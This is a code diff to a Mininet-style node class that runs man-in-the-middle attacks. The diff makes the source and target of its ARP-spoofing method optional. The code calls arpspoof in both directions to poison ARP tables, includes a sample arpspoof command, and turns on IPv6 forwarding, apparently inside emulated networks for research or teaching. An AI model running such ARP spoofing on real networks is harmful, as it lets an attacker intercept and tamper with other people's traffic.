@@ -281,15 +281,16 @@ class MiMNode( Node ):
     def __init__( self, name, source=None, inNamespace=True, **params ):
         Node.__init__(  self, name, inNamespace=True, **params  )
 
-    def start_spoof( self, source, target, use_ipv6=True ):
+    def start_spoof( self, source=None, target=None, use_ipv6=True ):
         # IPV4
         # cli example
         # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2 2>/dev/null 1>/dev/null & # send arp reply
         if not use_ipv6:
-            # fake MAC in arp table of source
-            self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % source.IP(), "%s" % target.IP(), " 2>/dev/null 1>/dev/null &")
-            # fake MAC in arp table of target
-            self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % target.IP(), "%s" % source.IP(), " 2>/dev/null 1>/dev/null &")
+            if source != None and target != None:
+                # fake MAC in arp table of source
+                self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % source.IP(), "%s" % target.IP(), " 2>/dev/null 1>/dev/null &")
+                # fake MAC in arp table of target
+                self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % target.IP(), "%s" % source.IP(), " 2>/dev/null 1>/dev/null &")
         # IPV6
         else:
             self.cmd('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')
